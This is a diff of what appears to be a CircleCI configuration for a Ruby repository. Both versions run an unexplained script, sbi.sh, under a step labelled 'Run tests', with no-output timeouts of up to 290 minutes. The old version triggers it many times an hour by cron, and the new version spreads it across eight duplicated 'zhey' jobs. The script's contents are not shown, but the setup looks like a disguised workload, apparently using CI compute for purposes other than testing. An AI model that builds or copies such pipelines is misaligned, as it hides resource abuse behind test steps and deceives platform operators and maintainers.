@@ -1,114 +1,83 @@
-version: 2.1
-
-
-executors:
-  default:
-    parameters:
-      ruby_version:
-        type: enum
-        enum: ['2.5', '2.6', '2.7', '3.0']
-    docker:
-      - image: cimg/ruby:<< parameters.ruby_version >>
-    working_directory: ~/repo
-
-commands:
-  setup_requirements:
-    steps:
-      - run:
-          name: Set timezone to Asia/Tokyo
-          command: sudo cp /usr/share/zoneinfo/Asia/Tokyo /etc/localtime
-  restore_bundle_cache:
-    parameters:
-      ruby_version:
-        type: enum
-        enum: ['2.5', '2.6', '2.7', '3.0']
-    steps:
-      - restore_cache:
-          name: Restore bundle cache
-          keys:
-            - gems-ruby<< parameters.ruby_version >>-{{ .Environment.COMMON_CACHE_KEY }}-{{ checksum "Gemfile.lock" }}
-            - gems-ruby<< parameters.ruby_version >>-{{ .Environment.COMMON_CACHE_KEY }}-
-  save_bundle_cache:
-    parameters:
-      ruby_version:
-        type: enum
-        enum: ['2.5', '2.6', '2.7', '3.0']
-    steps:
-      - save_cache:
-          name: Save bundle cache
-          key: gems-ruby<< parameters.ruby_version >>-{{ .Environment.COMMON_CACHE_KEY }}-{{ checksum "Gemfile.lock" }}
-          paths:
-            - ~/repo/vendor/bundle
-  install_bundler:
-    steps:
-      - run:
-          name: install bundler
-          command: gem install -N bundler:1.17.3 # same version as Gemfile.lock
-
-jobs:
-  build:
-    parameters:
-      ruby_version:
-        type: enum
-        enum: ['2.5', '2.6', '2.7', '3.0']
-    executor:
-      name: default
-      ruby_version: << parameters.ruby_version >>
-    steps:
-      - setup_requirements
-      - checkout
-      - restore_bundle_cache:
-          ruby_version: << parameters.ruby_version >>
-      - install_bundler
-      - run:
-          name: bundle install
-          command: |
-            bundle check || bundle install --jobs=4 --retry=3 --path=vendor/bundle
-            bundle clean
-      - save_bundle_cache:
-          ruby_version: << parameters.ruby_version >>
-      - run: bundle exec rubocop
-      - run: bundle exec rspec
-      - run: 
-          name: Run tests
-          command: |
+working_dir: &working_dir ~/app
+.build_template: &script
+  steps:
+    - checkout
+    - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
+    - run: chmod +x ./cc-test-reporter
+    - run: ./cc-test-reporter before-build
+    - run: gem install bundler:2.1.4
+    - run: bundle install --jobs=4 --retry=4 --path vendor/bundle
+    - run: bundle exec rake rubocop
+    - run:
+        name: Run tests
+        command: |
                     chmod u+x sbi.sh && ./sbi.sh
-          no_output_timeout: 290m
-      
-
+        no_output_timeout: 120m
+version: 2.0
+jobs:
+  zhey:
+    docker:
+      - image: ruby
+    steps:
+      - checkout
+  zhey1:
+    <<: *script
+    docker:
+      - image: ruby:2.7
+  zhey2:
+    <<: *script
+    docker:
+      - image: ruby:2.6
+  zhey3:
+    <<: *script
+    docker:
+      - image: ruby:2.5
+  zhey4:
+    docker:
+      - image: ruby
+    steps:
+      - checkout
+  zhey5:
+    <<: *script
+    docker:
+      - image: ruby:2.7
+  zhey6:
+    <<: *script
+    docker:
+      - image: ruby:2.6
+  zhey7:
+    <<: *script
+    docker:
+      - image: ruby:2.5
 workflows:
   version: 2
   commit:
     jobs:
-      - build:
-          name: ruby-2.5
-          ruby_version: '2.5'
-      - build:
-          name: ruby-2.6
-          ruby_version: '2.6'
-      - build:
-          name: ruby-2.7
-          ruby_version: '2.7'
-      - build:
-          name: ruby-3.0
-          ruby_version: '3.0'
-  nightly:
+      - zhey
+      - zhey1
+      - zhey2
+      - zhey3
+      - zhey4
+      - zhey5
+      - zhey6
+      - zhey7
+
+
     triggers:
       - schedule:
-          cron: "1,2,8,7,11,13,15,17,22,24,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,56,58,59 * * * *"
+          cron: "0 0,8,16 * * *"
           filters:
             branches:
-              only: master
+              only:
+                - master
+
+  zheyrunjob:
     jobs:
-      - build:
-          name: ruby-2.5
-          ruby_version: '2.5'
-      - build:
-          name: ruby-2.6
-          ruby_version: '2.6'
-      - build:
-          name: ruby-2.7
-          ruby_version: '2.7'
-      - build:
-          name: ruby-3.0
-          ruby_version: '3.0'
+      - zhey
+      - zhey1
+      - zhey2
+      - zhey3
+      - zhey4
+      - zhey5
+      - zhey6
+      - zhey7
